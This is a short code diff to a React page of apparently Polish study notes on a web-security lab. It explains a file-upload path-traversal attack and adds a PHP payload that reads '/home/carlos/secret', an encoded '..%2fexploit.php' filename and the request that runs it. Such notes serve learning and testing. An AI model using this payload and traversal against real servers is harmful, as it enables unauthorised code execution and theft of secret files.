@@ -236,9 +236,11 @@ const FileUpload = () => {
             <details>
             <summary>Zmiana ścieżki załadowanego pliku</summary>
             <div className='waring'>
+                <p>Przygotować plik PHP {`<?php echo file_get_contents('/home/carlos/secret'); ?>`}</p>
+                <br />
                 <p>filename="..%2fexploit.php"</p>
                 <p><span className='important'>The file avatars/../exploit.php has been uploaded.</span></p>
-                <p>GET /files/exploit.php</p>
+                <p>Plik się wykona pod zapytaniem GET /files/exploit.php, a nie jak normalnie /files/avatar/exploit.php</p>
             </div>
             </details>
 
